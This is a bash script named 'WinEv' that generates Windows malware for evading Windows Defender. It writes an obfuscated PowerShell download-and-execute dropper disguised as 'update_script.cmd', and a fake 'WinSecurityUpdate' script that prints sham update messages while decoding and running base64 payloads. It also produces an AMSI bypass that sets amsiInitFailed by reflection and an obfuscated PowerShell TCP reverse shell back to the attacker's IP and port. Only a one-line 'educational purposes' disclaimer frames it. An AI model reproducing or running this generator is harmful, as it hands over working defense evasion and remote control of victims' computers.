#!/bin/bash
rm -r WinEvFiles
RESTORE=$(printf '\033[0m')
RED=$(printf '\033[00;31m')
GREEN=$(printf '\033[00;32m')
YELLOW=$(printf  '\033[00;33m')

#Check if sudo is applied

#if [ $(id -u) != "0" ]; then
#  echo "[x] Permission denied: You need to be root"
#  echo "[x] execute [ sudo ./winev.sh ] on terminal"
#  exit
#else
#  :
#fi

payload1='powershelL -nop -c "iEx(new-object net.webclient).downloadstring'

echo  "$RED
                __          ___       ______                                       
                \ \        / (_)     |  ____|                                    
                 \ \  /\  / / _ _ __ | |____   __
                  \ \/  \/ / | | '_ \|  __\ \ / /
                   \  /\  /  | | | | | |___\ V / 
                    \/  \/   |_|_| |_|______\_/  
                 
                 +------------------------------------------+                      	
		 |WinEv v1.0      
		 |                                          |  
		 |Coded by DyaaTum          
		 |                                          |   
		 |Bypassing windows defender                  
		 +------------------------------------------+                          
$RESTORE
"
echo "$YELLOW**********************************************************************$RESTORE"
echo ""
echo "$RED""The developer is not responsible for any illegal use of this tool, it was built for educational purposes only$RESTORE"
echo ""
echo "Enter the IP address of the attacker machine:"
read ip

dtum="$USER"
echo $dtum
#Check if the IP format is correct

A=`echo "$ip" | awk '/^([0-9]{1,3}[.]){3}([0-9]{1,3})$/{print $1}'`
if [ -z $A ]; then
   ## IP is not correct and A is null/zero.
   echo "Your IP address is not correct, check the format."
   exit
else
  run=1
fi
echo "Enter the port to establish connection on:"
read port
if [ $port -gt 65535 ] 
then
echo " Wrong port, choose a port that is between 1-65535 "
exit
fi
if ! [[ "$port" =~ ^[0-9]+$ ]]
    then
        echo "Port number should be an integer only"
        exit
fi

#Simple obfuscation on the payload
finpayload=${payload1^^[p,d,e,l,o,n]}"('http://"$ip":8000/Desktop/WinEvFiles/WinSecurityUpdate')"'"'
mkdir /home/$dtum/Desktop/WinEvFiles
touch /home/$dtum/Desktop/WinEvFiles/update_script.cmd


#Adding more Content Obfuscation to the payload
obf='""'
p=3
text="${finpayload:0:p}$obf${finpayload:p}"
p=9
text2="${text:0:p}$obf${text:p}"
p=18
text3="${text2:0:p}$obf${text2:p}"
echo "@ECHO OFF" > /home/$dtum/Desktop/WinEvFiles/update_script.cmd
printf "$text3" >> /home/$dtum/Desktop/WinEvFiles/update_script.cmd
#Base64 Encoding powershell commands to be executed on the victim`s machine
payloada1="InVOkE-EXpreSSIoN (New-OBjECt NeT.WEbCLienT).DowNlOaDSTrinG('http://$ip:8000/Desktop/WinEvFiles/a1')"
rem="sed 's/ //g'"
payloada1obf=$(echo -n $payloada1 | base64)
payloadr1="InVOkE-EXpreSSIoN (New-OBjECt NeT.WEbCLienT).DowNlOaDSTrinG('http://$ip:8000/Desktop/WinEvFiles/r1')"
payloadr1obf=$(echo -n $payloadr1 | base64)
touch /home/$dtum/Desktop/WinEvFiles/WinSecurityUpdate
winsecfile='echo "[!] Preparing System for Update"
echo "[*] ============================"
start-sleep -s 1
echo "[*]"
start-sleep -s 1
echo "[*]"
start-sleep -s 1
echo "[*]"
echo "[!] Starting Update Process."
echo "[*] ============================"
start-sleep -s 1
echo "[*]"
start-sleep -s 1
echo "[*]"
start-sleep -s 1
echo "[*]"'
printf "$winsecfile" >> /home/$dtum/Desktop/WinEvFiles/WinSecurityUpdate
printf "\n" >> /home/$dtum/Desktop/WinEvFiles/WinSecurityUpdate
printf "\n" >> /home/$dtum/Desktop/WinEvFiles/WinSecurityUpdate
echo '$a1="'$payloada1obf'"' >> /home/$dtum/Desktop/WinEvFiles/WinSecurityUpdate
echo '$r1="'$payloadr1obf'"' >> /home/$dtum/Desktop/WinEvFiles/WinSecurityUpdate
printf "\n" >> /home/$dtum/Desktop/WinEvFiles/WinSecurityUpdate

lastwinsec='start-sleep -s 1

echo "[*]"
start-sleep -s 1
echo "[!] Update Process Completed"
start-sleep -s 1

$update_a1 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($a1))
$update_r1 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($r1))

echo $update_a1 | pow""ersh""ell -nop - ; echo $update_r1 | pow""e""rsh""ell -nop -'

printf "$lastwinsec" >> /home/$dtum/Desktop/WinEvFiles/WinSecurityUpdate
a1payload='$w ='" 'System.Management.Automation.A'"
a1payload2=';$c = '"'si'"';$m = '"'Utils'"' ;; $assembly = [Ref].Assembly.GetType(('"'{0}m{1}{2}'"' -f $w,$c,$m)) ;; $field = $assembly.GetField(('"'am{0}InitFailed'"' -f $c),'"'NonPublic,Static'"') ;; $field.SetValue($null,$true)'
touch /home/$dtum/Desktop/WinEvFiles/a1
printf "$a1payload" >> /home/$dtum/Desktop/WinEvFiles/a1
echo "$a1payload2" >> /home/$dtum/Desktop/WinEvFiles/a1
r1filhead='$client ='
r1fileuserinput='new-object system.net.sockets.tcpclient("'$ip'"'','$port')'
r1filecon=';$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
notfinr1=${r1fileuserinput^^[c,d,e,l,s,n]}"$r1filecon"

#Obfuscating the content of r1 file

obf='""'
p=2
r1obf="${notfinr1:0:p}$obf${notfinr1:p}"
p=9
r1obf2="${r1obf:0:p}$obf${r1obf:p}"
p=16
r1obf3="${r1obf2:0:p}$obf${r1obf2:p}"
p=20
r1obf4="${r1obf3:0:p}$obf${r1obf3:p}"
p=27
r1obf5="${r1obf4:0:p}$obf${r1obf4:p}"
p=33
r1obf6="${r1obf5:0:p}$obf${r1obf5:p}"
p=39
r1obf7="${r1obf6:0:p}$obf${r1obf6:p}"
p=45
r1obf8="${r1obf7:0:p}$obf${r1obf7:p}"
p=50
r1obf9="${r1obf8:0:p}$obf${r1obf8:p}"
p=54
r1obf10="${r1obf9:0:p}$obf${r1obf9:p}"

touch /home/$dtum/Desktop/WinEvFiles/r1
echo "$r1filhead""$r1obf10" > /home/$dtum/Desktop/WinEvFiles/r1
#if [ $run -eq 1 ] 
#then
  echo "[$GREEN+$RESTORE]$YELLOW Building shellcode ...$RESTORE"
  sleep 2
  echo "[$GREEN+$RESTORE]$YELLOW Obfuscating the shellcode...$RESTORE "
  sleep 2
  echo "[$GREEN+$RESTORE]$YELLOW Generating the malware files $RESTORE"
  sleep 2
  echo "[$GREEN✔$RESTORE]$YELLOW Malware files have been successfully generated and saved to your Desktop $RESTORE"
  echo "If you dont know what to do next check README file "
#fi








